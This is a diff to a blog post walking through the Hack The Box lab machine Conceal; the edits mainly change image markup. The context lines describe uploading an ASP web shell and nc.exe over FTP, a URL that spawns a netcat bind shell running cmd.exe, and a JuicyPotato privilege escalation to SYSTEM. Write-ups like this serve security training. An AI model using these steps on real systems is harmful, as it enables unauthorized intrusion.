@@ -17,10 +17,10 @@ This post documents the complete walkthrough of Conceal, a retired vulnerable [V
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -604,15 +604,15 @@ Simple and self-explanatory.
 
 Time to establish the connection!
 
-<a class="image-popup">
-![29e2bb81.png](/assets/images/posts/conceal-htb-walkthrough/29e2bb81.png)
-</a>
+
+{% include image.html image_alt="29e2bb81.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/29e2bb81.png" %}
+
 
 When that's done, let's test it out with my browser since `80/tcp` is open.
 
-<a class="image-popup">
-![1195cdab.png](/assets/images/posts/conceal-htb-walkthrough/1195cdab.png)
-</a>
+
+{% include image.html image_alt="1195cdab.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/1195cdab.png" %}
+
 
 We can now re-run `nmap` on the open ports. Note that we need to use `nmap`'s connect scan with the `-sT` switch because,
 
@@ -673,15 +673,15 @@ Requests/sec.: 19.70690
 
 Hmm. Where can I upload files? FTP of course.
 
-<a class="image-popup">
-![7ba7f207.png](/assets/images/posts/conceal-htb-walkthrough/7ba7f207.png)
-</a>
+
+{% include image.html image_alt="7ba7f207.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/7ba7f207.png" %}
+
 
 Here's proof that the file was successfully uploaded.
 
-<a class="image-popup">
-![97ad894b.png](/assets/images/posts/conceal-htb-walkthrough/97ad894b.png)
-</a>
+
+{% include image.html image_alt="97ad894b.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/97ad894b.png" %}
+
 
 Armed with this knowledge, we can upload a simple ASP file that executes commands remotely.
 
@@ -725,9 +725,9 @@ Response.Write Server.HTMLEncode(thisDir)%>
 
 While we are at it, we might as well upload `nc.exe` to see if we can spawn a bind shell because I noticed that there's a script that deletes whatever is in `/upload` rather quickly.
 
-<a class="image-popup">
-![8c765d2a.png](/assets/images/posts/conceal-htb-walkthrough/8c765d2a.png)
-</a>
+
+{% include image.html image_alt="8c765d2a.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/8c765d2a.png" %}
+
 
 Remote command execution unlocked! Time to spawn that bind shell.
 
@@ -735,25 +735,25 @@ Remote command execution unlocked! Time to spawn that bind shell.
 http://10.10.10.116/upload/hello.asp?cmd=c%3A%5Cinetpub%5Cwwwroot%5Cupload%5Cnc.exe+-lnvp+12345+-e+cmd.exe
 ```
 
-<a class="image-popup">
-![d18e05b1.png](/assets/images/posts/conceal-htb-walkthrough/d18e05b1.png)
-</a>
+
+{% include image.html image_alt="d18e05b1.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/d18e05b1.png" %}
+
 
 Awesome.
 
 The `proof.txt` is at `Destitute`'s desktop.
 
-<a class="image-popup">
-![18d89cbb.png](/assets/images/posts/conceal-htb-walkthrough/18d89cbb.png)
-</a>
+
+{% include image.html image_alt="18d89cbb.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/18d89cbb.png" %}
+
 
 ## Privilege Escalation
 
 During enumeration of `destitute`'s account, I notice that the account has these privileges.
 
-<a class="image-popup">
-![43c7f1eb.png](/assets/images/posts/conceal-htb-walkthrough/43c7f1eb.png)
-</a>
+
+{% include image.html image_alt="43c7f1eb.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/43c7f1eb.png" %}
+
 
 I smell potato cooking! There were different types of potato uncovered in my reseach and oh boy, in the end the "juicy" one seems the most promising because of the various command switches available. More importantly, I can change to a different COM server other than BITS.
 
@@ -763,27 +763,27 @@ The CLSID of `UsoSvc` is `{B91D5831-B1BD-4608-8198-D72E155020F7}`. We are now se
 
 I upload the exploit `jp.exe` to `C:\inetpub\wwwroot\upload` via FTP.
 
-<a class="image-popup">
-![c82281ea.png](/assets/images/posts/conceal-htb-walkthrough/c82281ea.png)
-</a>
+
+{% include image.html image_alt="c82281ea.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/c82281ea.png" %}
+
 
 Then I run the exploit.
 
-<a class="image-popup">
-![c77223ea.png](/assets/images/posts/conceal-htb-walkthrough/c77223ea.png)
-</a>
+
+{% include image.html image_alt="c77223ea.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/c77223ea.png" %}
+
 
 Meanwhile at my `nc` listener, a `SYSTEM` shell appears.
 
-<a class="image-popup">
-![32f269c0.png](/assets/images/posts/conceal-htb-walkthrough/32f269c0.png)
-</a>
+
+{% include image.html image_alt="32f269c0.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/32f269c0.png" %}
+
 
  Getting `proof.txt` is trivial when you have `SYSTEM` privileges.
 
-<a class="image-popup">
- ![4f0808db.png](/assets/images/posts/conceal-htb-walkthrough/4f0808db.png)
-</a>
+
+ {% include image.html image_alt="4f0808db.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/4f0808db.png" %}
+
 
 [1]: https://www.hackthebox.eu/home/machines/profile/168
 [2]: https://www.hackthebox.eu/home/users/profile/1545
